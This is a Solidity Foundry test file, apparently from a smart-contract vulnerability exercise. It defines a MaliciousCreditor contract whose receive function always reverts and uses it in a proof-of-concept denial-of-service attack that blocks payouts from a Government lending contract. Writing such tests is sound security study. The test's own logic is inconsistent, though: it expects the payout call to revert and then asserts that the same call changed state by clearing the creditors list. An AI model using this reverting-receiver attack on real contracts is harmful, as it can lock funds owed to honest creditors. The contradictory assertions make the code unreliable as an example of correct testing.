```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/list_dos.sol";

contract MaliciousCreditor {
    // This contract will always revert when receiving ETH
    receive() external payable {
        revert("Malicious contract blocking payments");
    }
}

contract GovernmentTest is Test {
    Government government;
    MaliciousCreditor maliciousCreditor;
    address honestUser = address(0x1);
    address corruptElite;

    function setUp() public {
        // Deploy Government contract with 1 ETH initial balance
        government = new Government{value: 1 ether}();
        corruptElite = government.corruptElite();

        // Deploy malicious creditor contract and fund it
        maliciousCreditor = new MaliciousCreditor();
        vm.deal(address(maliciousCreditor), 10 ether);

        // Fund honest user
        vm.deal(honestUser, 10 ether);
    }

    function testDenialOfServiceAttack() public {
        // Record initial balances
        uint256 initialMaliciousBalance = address(maliciousCreditor).balance;
        uint256 initialHonestBalance = honestUser.balance;
        uint256 initialGovBalance = address(government).balance;

        // Step 1: Malicious creditor lends money to government
        vm.prank(address(maliciousCreditor));
        government.lendGovernmentMoney{value: 1 ether}(address(0));

        // Step 2: Honest user lends money to government
        vm.prank(honestUser);
        government.lendGovernmentMoney{value: 1 ether}(address(0));

        // Verify both creditors are registered
        address[] memory creditors = government.getCreditorAddresses();
        assertEq(creditors.length, 2, "Should have 2 creditors");
        assertEq(creditors[0], address(maliciousCreditor), "Malicious creditor should be first");
        assertEq(creditors[1], honestUser, "Honest user should be second");

        // Step 3: Advance time to allow payout
        vm.warp(block.timestamp + 12 hours + 1);

        // Step 4: Trigger payout via fallback (should fail when trying to pay malicious creditor)
        vm.expectRevert();
        address(government).call{value: 1 wei}("");

        // Verify system is stuck - lastCreditorPayedOut hasn't advanced
        assertEq(government.lastCreditorPayedOut(), 0, "System should be stuck");

        // Verify creditors list was cleared due to failed payout
        creditors = government.getCreditorAddresses();
        assertEq(creditors.length, 0, "Creditors list should be cleared after failed payout");

        // Verify balances
        assertEq(
            address(maliciousCreditor).balance,
            initialMaliciousBalance - 1 ether,
            "Malicious creditor should have only sent funds"
        );
        assertEq(
            honestUser.balance,
            initialHonestBalance - 1 ether,
            "Honest user should have only sent funds"
        );
        assertGt(
            address(government).balance,
            initialGovBalance,
            "Government should have received funds"
        );
    }
}
```
